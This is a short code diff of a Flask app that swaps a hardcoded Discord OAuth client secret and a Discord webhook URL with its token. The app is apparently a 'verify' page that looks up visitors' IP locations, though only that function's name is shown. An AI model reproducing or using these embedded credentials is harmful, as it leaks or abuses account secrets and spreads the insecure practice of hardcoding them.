@@ -9,9 +9,9 @@ app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
 DISCORD_CLIENT_ID = "1367928958510829608"
-DISCORD_CLIENT_SECRET = "rVnrrdlXwkoCQanyQUEwKBz7lFax3SKN"
+DISCORD_CLIENT_SECRET = "-k4W6e-DL5VA6D6Bt0M8S96JNuRxu1xt"
 REDIRECT_URI = "https://verify-jaf.onrender.com/callback"
-WEBHOOK_URL = "https://discord.com/api/webhooks/1366804921487196171/TOWO1jQkASCrgOv0bEOzVqW725r7vuGiRxnjAx2TYjgZzdVf6VIv2ZOVsURCEl2THEbc"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1374423972887793784/VKX7XQTVXqc_R29_-Qp1UeC_KcFtM8Z2d5mu85339p81ZsHno984RDOnlz-uxOy0ZBFb"
 
 def get_location(ip):
     try:
